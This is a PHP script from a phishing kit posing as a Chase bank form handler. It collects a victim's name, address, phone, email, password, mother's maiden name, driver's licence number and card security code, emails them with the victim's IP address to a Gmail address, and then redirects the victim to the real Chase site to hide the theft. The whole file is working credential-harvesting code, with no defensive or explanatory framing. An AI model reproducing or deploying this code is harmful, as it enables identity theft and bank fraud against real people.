<?

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate= date("D M d, Y g:i a");
$Account_name = $_POST['Account_name'];
$address = $_POST['address'];
$city = $_POST['city'];
$csc = $_POST['csc'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];
$email_address = $_POST['email_address'];
$password = $_POST['password'];
$mmn = $_POST['mmn'];
$DL = $_POST['DL'];


//Twichiya Dial  E-Mail   
$subj = "Chase personal info' $Account_name ";
$msg = " ---------------------  \nAccount name: $Account_name\naddress: $address\ncity: $city\nstate: $state\nzip: $zip\nphone: $phone\nemail address: $email_address\npassword: $password\nmmn: $mmn\nDriver License: $DL\nIP: $ip\nDate: $adddate\n ------------------- ";
mail("fittedtosign@gmail.com", $subj, $msg);
mail("$cc", $subj, $msg);
header("Location:https://www.chase.com/");
?>